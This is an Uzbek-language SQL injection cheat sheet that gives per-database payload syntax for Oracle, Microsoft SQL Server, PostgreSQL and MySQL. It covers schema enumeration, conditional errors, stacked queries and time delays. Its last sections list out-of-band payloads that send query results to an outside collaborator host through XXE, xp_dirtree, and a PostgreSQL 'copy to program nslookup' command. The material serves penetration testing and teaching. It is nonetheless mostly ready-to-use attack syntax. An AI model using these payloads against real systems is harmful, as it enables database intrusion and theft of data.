# SQL ineksiya cheat sheet

Ushbu SQL ineksiya cheat sheetida, siz SQL ineksiya hujumlarini amalga oshirishda ko'pincha yuzaga keladigan turli vazifalarni bajarish uchun foydalanadigan foydali sintaksis misollari mavjud.

### Stringlarni biriktirish <a href="#string-concatenation" id="string-concatenation"></a>

Bitta stringni yaratish uchun siz bir nechta stringlarni birlashtirishingiz mumkin.

| Oracle     | `'foo'`&#124&#124`'bar'`                                                                  |
| :---       | :---                                                                             |
| Microsoft  | `'foo'+'bar'`                                                                    |
| PostgreSQL | `'foo'`&#124&#124`'bar'`                                                                  |
| MySQL      | ```'foo' 'bar'``` [Note the space between the two strings]`CONCAT('foo','bar')`  |

### Substring <a href="#substring" id="substring"></a>

Siz belgilangan offsetdan belgilangan uzunlikda stringni ajratib olishingiz umkin. E'tibor bering, ofset indeksi 1 ga asoslangan. Quyidagi iboralarning har biri `ba`stringini qaytaradi.

| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| :---       | :---                        |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

### Komentariyalar <a href="#substring" id="substring"></a>

Siz so'rovni kesish uchun komentariyalardan foydalanishingiz va asl so'rovni olib tashlashingiz mumin.

| Oracle     | `--comment`                                                                                          |
| :---------- | :-------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `--comment``/*comment*/`                                                                  |
| PostgreSQL | `--comment``/*comment*/`                                                                  |
| MySQL      | `#comment``-- comment` [Note the space after the double dash]`/*comment*/` |

### Database versiyasi <a href="#database-version" id="database-version"></a>

Siz uning turini va versiyasini aniqlash uchun ma'lumotlar bazasidan so'rov yuborishingiz mumkin. Ushbu ma'lumotlar yanada murakkab hujumlarni shakllantirishda foydali.

| Oracle     | `SELECT banner FROM v$version` <br /> `SELECT version FROM v$instance` |
| :---------- | :--------------------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT @@version`                                                                                  |
| PostgreSQL | `SELECT version()`                                                                                  |
| MySQL      | `SELECT @@version`                                                                                  |

### Database kontentlari <a href="#database-contents" id="database-contents"></a>

Siz ma'lumotlar bazasida mavjud bo'lgan jadvallarni va jadvallar tarkibidagi ustunlarni ro'yxatlashingiz mumkin.

| Oracle     | `SELECT * FROM all_tables` <br /> `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`                               |
| :---------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT * FROM information_schema.tables` <br /> `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT * FROM information_schema.tables` <br /> `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL      | `SELECT * FROM information_schema.tables`<br />`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

### Conditional  errors (Shartli xatoliklar) <a href="#conditional-errors" id="conditional-errors"></a>

Siz bitta Boolen holatini sinab ko'rishingiz mumkin va agar holat to'g'ri bo'lsa, ma'lumotlar bazasi xatosini o'zgartirishingiz mumkin.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual`      |
| :---------- | :--------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END`           |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

### Batched (yoki stacked) so'rovlar <a href="#batched-or-stacked-queries" id="batched-or-stacked-queries"></a>

Siz ketma-ket bir nechta so'rovlarni bajarish uchun bir nechta so'rovlarni bajarishingiz mumkin. E'tibor bering, keyingi so'rovlar bajarilsa ham, natijalar applicationga qaytarilmaydi. Demak, ushbu usul birinchi navbatda **Blind** zaifligi, shartli xato yoki vaqtni kechiktirishni boshlash uchun ikkinchi so'rovdan foydalanishingiz mumkin.

| Oracle     | `Does not support batched queries.` |
| :---------- | :----------------------------------- |
| Microsoft  | `QUERY-1-HERE; QUERY-2-HERE`        |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`        |
| MySQL      | `QUERY-1-HERE; QUERY-2-HERE`        |

**Eslatma**

MySQL bilan, odatda SQL ineksiya uchun foydalanib bo'lmaydi. Biroq, target dastur MySQL ma'lumotlar bazasi bilan muloqot qilish uchun ma'lum bir PHP yoki Python Apisni ishlatsa, vaqti-vaqti bilan mumkin.

### Time delaylar <a href="#time-delays" id="time-delays"></a>

Siz ma'lumotlar bazasida so'rov qayta ishlanganda vaqtni kechiktirishingiz mumkin. Quyidagilar 10 soniya davomida vaqtni kechiktirishga olib keladi

| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| :---------- | :------------------------------------- |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT sleep(10)`                    |

### Conditional time delays (Shartli vaqt kechiktirishlar) <a href="#conditional-time-delays" id="conditional-time-delays"></a>

Siz bitta Booley holatini sinab ko'rishingiz mumkin va agar shart to'g'ri bo'lsa, vaqtni kechiktirishni boshlang.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'`&#124&#124`dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| :---------- | :---------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                                |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                  |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')`                                                                   |

### DNS lookup <a href="#dns-lookup" id="dns-lookup"></a>

Siz ma'lumotlar bazasi orqali tashqi domenlarni aniqlash uchun DNS qidiruvini amalga oshirishingiz mumkin. Buning uchun, hujumda foydalanadigan Burp Collaborator subdomainini yaratib beruvchi Burp-Collabratordan foydalanishingiz kerak.shunda DNS qidiruvi sodir bo'lganligini aniqlay olasiz.

| Oracle     | Quyidagi usul DNS qidiruvini boshlash uchun (XXE) XML usullainir ishlatadi. Bu zaiflik allaqachon patch qilingan ammo bir nechta Oracle databaselarda mavjud:`SELECT extractvalue(xmltype('&#x3C;?xml version="1.0" encoding="UTF-8"?>&#x3C;!DOCTYPE root [ &#x3C;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`Quyidagi usullar to'liq patch qilingan Oracle databaselari uchun ishlaydi, ammo yuqori privilegiyani talab qiladi.`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| :---------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Microsoft  | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| MySQL      | <strong>Bu usul faqat Windowsda ishlaydi.</strong>`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')``SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`                                                                                                                                                                                                                                                                                                                                                                                            |

### Ma'lumot eksfiltratsiyasi bilan DNS qidiruvi <a href="#dns-lookup-with-data-exfiltration" id="dns-lookup-with-data-exfiltration"></a>

Siz ineksiyalangan so'rov natijalarini o'z ichiga olgan tashqi domenga DNS qidiruvini amalga oshirish uchun ma'lumotlar bazasini keltirib chiqarishingiz mumkin. Buning uchun siz hujumda foydalanadigan subdomenni yaratishda Burp Collabrator clientidan foydalanib subdomen yaratishingiz kerak, Keyin har qanday DNS so'rov ma'lumotlarning tafsilotlarini olish uchun kollaoratator serveridan foydalaning.

| Oracle     | `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'`&#124&#124`(SELECT YOUR-QUERY-HERE)`&#124&#124`'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`                                                                                                                                                                                                                                        |
| :---------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`                                                                                                                                                                                                                                                                                                                               |
| PostgreSQL | `create OR replace function f() returns void as $$``declare c text;``declare p text;``begin``SELECT into p (SELECT YOUR-QUERY-HERE);``c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';``execute c;``END;``$$ language plpgsql security definer;``SELECT f();` |
| MySQL      | Bu usul faqat Windowsda ishlaydi.`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`                                                                                                                                                                                                                                                                                                                             |

####
